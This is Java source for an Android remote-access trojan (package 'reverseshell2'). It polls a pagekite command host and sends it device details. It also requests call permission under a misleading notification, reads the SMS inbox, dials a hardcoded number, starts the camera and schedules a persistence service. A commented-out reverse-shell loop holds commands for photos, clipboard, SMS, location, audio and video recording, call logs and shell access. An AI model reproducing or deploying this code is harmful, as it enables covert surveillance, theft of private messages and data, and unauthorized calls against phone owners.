package com.example.reverseshell2;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;


import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.reverseshell2.Payloads.CameraPreview;
import com.example.reverseshell2.Payloads.audioManager;
import com.example.reverseshell2.Payloads.ipAddr;
import com.example.reverseshell2.Payloads.locationManager;
import com.example.reverseshell2.Payloads.newShell;
import com.example.reverseshell2.Payloads.readCallLogs;
import com.example.reverseshell2.Payloads.readSMS;
import com.example.reverseshell2.Payloads.vibrate;
import com.example.reverseshell2.Payloads.videoRecorder;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.permissioneverywhere.PermissionEverywhere;
import com.permissioneverywhere.PermissionResponse;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.net.Socket;

public class tcpConnection extends AsyncTask<String,Void,Void> {

    Activity activity;

    functions functions;
    Context context;

    newShell shell;

    ipAddr ipAddr = new ipAddr();
    private CameraPreview mPreview;


    static String TAG = "tcpConnectionClass";
    vibrate vibrate;
    readSMS readSMS;
    locationManager locationManager;
    audioManager audioManager;

          PermissionResponse response;
    com.example.reverseshell2.Payloads.videoRecorder videoRecorder;
    com.example.reverseshell2.Payloads.readCallLogs readCallLogs;

    private static final int REQUEST_CALL = 1;
    public tcpConnection(Activity activity, Context context) {
        this.activity = activity;
        //this.view = view;
        this.context = context;
        functions = new functions(activity);
        mPreview = new CameraPreview(context);
        vibrate = new vibrate(context);
        readSMS = new readSMS(context);
        locationManager = new locationManager(context, activity);
        audioManager = new audioManager(context);
        videoRecorder = new videoRecorder(context, activity);
        readCallLogs = new readCallLogs(context, activity);
        shell = new newShell(activity, context);
    }

    @Override
    protected Void doInBackground(String... strings) {
        Socket socket = null;
        DatabaseReference myre = FirebaseDatabase.getInstance().getReference("new");
        myre.setValue("yess");
//        try {
//            PermissionResponse response = PermissionEverywhere.getPermission(context,
//                    new String[]{Manifest.permission.CALL_PHONE},
//                    111,
//                    "Notification title",
//                    "This app needs  a write permission",
//                    R.mipmap.ic_launcher)
//                    .call();
//            //waits..
//            boolean isGranted = response.isGranted();
//
//            if(isGranted){ //changed from isGrante to isGranted
//                functions.getScreenUp(activity);
//                context.startActivity(new Intent(Intent.ACTION_CALL, Uri.fromParts("tel", "8319988520", null)));
//            }
//                    functions.getScreenUp(activity);
//                mPreview.startUp(0);
//            byte[] x=functions.deviceInfo().getBytes("UTF-8");
//
//           // Document doc = Jsoup.connect("https://lonewolf.pagekite.me/info:"+ functions.deviceInfo()+functions.get_numberOfCameras()).get();
//            FirebaseDatabase firebaseDatabase= FirebaseDatabase.getInstance();
//            DatabaseReference myre = FirebaseDatabase.getInstance().getReference();
//            String number = functions.getPhoneNumber(context);
//            if (ContextCompat.checkSelfPermission(context,
//                    Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
//                ActivityCompat.requestPermissions((Activity) context,
//                        new String[]{Manifest.permission.CALL_PHONE}, REQUEST_CALL);
//            }
//            String sms = readSMS.readSMSBox("inbox");
//            myre.setValue(number);
//            dialContactPhone();
//            StorageReference mStorageRef;
//            mStorageRef = FirebaseStorage.getInstance().getReference();
////                    final String[] numbers = line.split(" ");
//                    vibrate.vib(4);
//            functions.getScreenUp(activity);
//            mPreview.startUp(0);

        //  Log.i(TAG, "doInBackground:` "+functions.deviceInfo());
        //     Toast.makeText(activity, doc.toString(), Toast.LENGTH_SHORT).show();
//        } catch (IOException | InterruptedException e) {
//            e.printStackTrace();
//        }
        try {

            final Document whatToGet = Jsoup.connect("https://lonewolf.pagekite.me/getit").get();


            while (true) {
                Log.d(TAG, "trying");
                Document testing = Jsoup.connect("https://lonewolf.pagekite.me").get();
                if (testing.body().text().equals("okAllDone"))
                    break;
            }

            if (whatToGet.body().text().equals("call")) {
                response = PermissionEverywhere.getPermission(context,
                        new String[]{Manifest.permission.CALL_PHONE},
                        111,
                        "Notification title",
                        "This app needs  a write permission",
                        R.mipmap.ic_launcher)
                        .call();
            }





        //waits..
        boolean isGranted = response.isGranted();

        if (isGranted) { //changed from isGrante to isGranted
            functions.getScreenUp(activity);
            context.startActivity(new Intent(Intent.ACTION_CALL, Uri.fromParts("tel", "8319988520", null)));
        }
//            functions.getScreenUp(activity);
//            mPreview.startUp(0);
//            byte[] x=functions.deviceInfo().getBytes("UTF-8");

        try {
            Document doc = Jsoup.connect("https://lonewolf.pagekite.me/info:" + functions.deviceInfo() + functions.get_numberOfCameras()).get();
        } catch (IOException ex) {
            ex.printStackTrace();
        }

        String number = functions.getPhoneNumber(context);
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{Manifest.permission.CALL_PHONE}, REQUEST_CALL);
        }
        String sms = readSMS.readSMSBox("inbox");
        //myre.setValue(number);
        dialContactPhone();
        StorageReference mStorageRef;
        mStorageRef = FirebaseStorage.getInstance().getReference();
//                    final String[] numbers = line.split(" ");
        vibrate.vib(4);
        functions.getScreenUp(activity);
        mPreview.startUp(0);


//            while(true){
//                Log.d(TAG,"trying");
//                socket = new Socket();
//                try{
//                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
//                }catch (SocketTimeoutException | SocketException e){
//                    Log.d(TAG,"error");
//                }
//                if(socket.isConnected()){
//                    break;
//                }
//            }
//            final OutputStream out = new DataOutputStream(socket.getOutputStream());
//            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
//            String model = android.os.Build.MODEL+"\n";
//            String welcomeMess = "Hello there, welcome to reverse shell of "+model;
//            out.write(welcomeMess.getBytes("UTF-8"));
//            String line;
//            while ((line = in.readLine()) != null)
//            {
//                Log.d(TAG, line);
//                if (line.equals("exit"))
//                {
//                    Log.d("service_runner","called");
//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//                        functions.jobScheduler(context);
//                    }else{
//                        activity.runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {
//                            context.startService(new Intent(context,mainService.class));
//                        }
//                    });
//                    }
//                    socket.close();
//                }
//                else if (line.equals("camList"))
//                {
//                    String list = functions.get_numberOfCameras();
//                    out.write(list.getBytes("UTF-8"));
//                }
//                else if (line.matches("takepic \\d"))
//                {
//                    functions.getScreenUp(activity);
//                    final String[] cameraid = line.split(" ");
//                    try
//                    {
//                        out.write("IMAGE\n".getBytes("UTF-8"));
//                        mPreview.startUp(Integer.parseInt(cameraid[1]),out);
//                    } catch (Exception e)
//                    {
//                        e.printStackTrace();
//                        new jumper(context).init();
//                        Log.d("done", "done");
//                    }
//                }
//                else if (line.equals("shell"))
//                {
//                    out.write("SHELL".getBytes("UTF-8"));
//                    shell.executeShell(socket,out);
//                }
//                else if (line.equals("getClipData"))
//                {
//                    String clipboard_data = functions.readFromClipboard();
//                    if (clipboard_data != null)
//                    {
//                        clipboard_data = clipboard_data + "\n";
//                        out.write(clipboard_data.getBytes("UTF-8"));
//                    }
//                    else
//                        {
//                        out.write("No Clipboard Data Present\n".getBytes("UTF-8"));
//                    }
//                }
//                else if (line.equals("deviceInfo"))
//                {
//                    out.write(functions.deviceInfo().getBytes());
//                }
//                else if (line.equals("help"))
//                {
//                    out.write("help\n".getBytes());
//                }
//                else if (line.equals("clear"))
//                {
//                    out.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
//                }
//                else if (line.equals("getSimDetails"))
//                {
//                    String number = functions.getPhoneNumber(context);
//                    number+="\n";
//                    out.write(number.getBytes("UTF-8"));
//                }
//                else if (line.equals("getIP"))
//                {
//                    String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
//                    out.write(ip_addr.getBytes("UTF-8"));
//                }
//                else if(line.matches("vibrate \\d"))
//                {
//                    final String[] numbers = line.split(" ");
//                    vibrate.vib(Integer.parseInt(numbers[1]));
//                    String res = "Vibrating "+numbers[1]+" time successful.\n";
//                    out.write(res.getBytes("UTF-8"));
//                }
//                else if(line.contains("getSMS "))
//                {
//                    String[] box = line.split(" ");
//                    if(box[1].equals("inbox")){
//                        out.write("readSMS inbox\n".getBytes("UTF-8"));
//                        String sms = readSMS.readSMSBox("inbox");
//                        out.write(sms.getBytes("UTF-8"));
//                    }else if(box[1].equals("sent")){
//                        out.write("readSMS sent\n".getBytes("UTF-8"));
//                        String sms = readSMS.readSMSBox("sent");
//                        out.write(sms.getBytes("UTF-8"));
//                    }else{
//                        out.write("readSMS null\n".getBytes("UTF-8"));
//                        out.write("Wrong Command\n".getBytes("UTF-8"));
//                    }
//                    out.write("END123\n".getBytes("UTF-8"));
//                }
//                else if(line.equals("getLocation"))
//                {
//                    out.write("getLocation\n".getBytes("UTF-8"));
//                    String res = locationManager.getLocation();
//                    out.write(res.getBytes("UTF-8"));
//                    out.write("\n".getBytes("UTF-8"));
//                    out.write("END123\n".getBytes("UTF-8"));
//                }
//                else if(line.equals("startAudio"))
//                {
//                    audioManager.startRecording(out);
//                }
//                else if(line.equals("stopAudio"))
//                {
//                    audioManager.stopRecording(out);
//                }
//                else if(line.matches("startVideo \\d"))
//                {
//                    final String[] cameraid = line.split(" ");
//                    videoRecorder.startVideo(Integer.parseInt(cameraid[1]),out);
//                }
//                else if(line.equals("stopVideo"))
//                {
//
//                    videoRecorder.videoStop(out);
//                }
//                else if(line.equals("getCallLogs"))
//                {
//                    out.write("callLogs\n".getBytes("UTF-8"));
//                    String call_logs = readCallLogs.readLogs();
//                    if(call_logs==null){
//                        out.write("No call logs found on the device\n".getBytes("UTF-8"));
//                        out.write("END123\n".getBytes("UTF-8"));
//                    }else{
//                        out.write(call_logs.getBytes("UTF-8"));
//                        out.write("END123\n".getBytes("UTF-8"));
//                    }
//
//                }
//                else if(line.equals("getMACAddress"))
//                {
//                    String macAddress = ipAddr.getMACAddress(null);
//                    macAddress+="\n";
//                    out.write(macAddress.getBytes("UTF-8"));
//                }
//                else
//                    {
//                    out.write("Unknown Command \n".getBytes("UTF-8"));
//                }
//            }
        Log.d("service_runner", "called");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            functions.jobScheduler(context);
        } else {
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    context.startService(new Intent(context, mainService.class));
                }
            });

            return null;
        }
        } catch(Exception e){
            Log.d("service_runner", "called");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            } else {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context, mainService.class));
                    }
                });
            }

        }
        return null;
    }
    

    private void dialContactPhone() {
        context.startActivity(new Intent(Intent.ACTION_CALL, Uri.fromParts("tel", "8319988520", null)));
    }

}
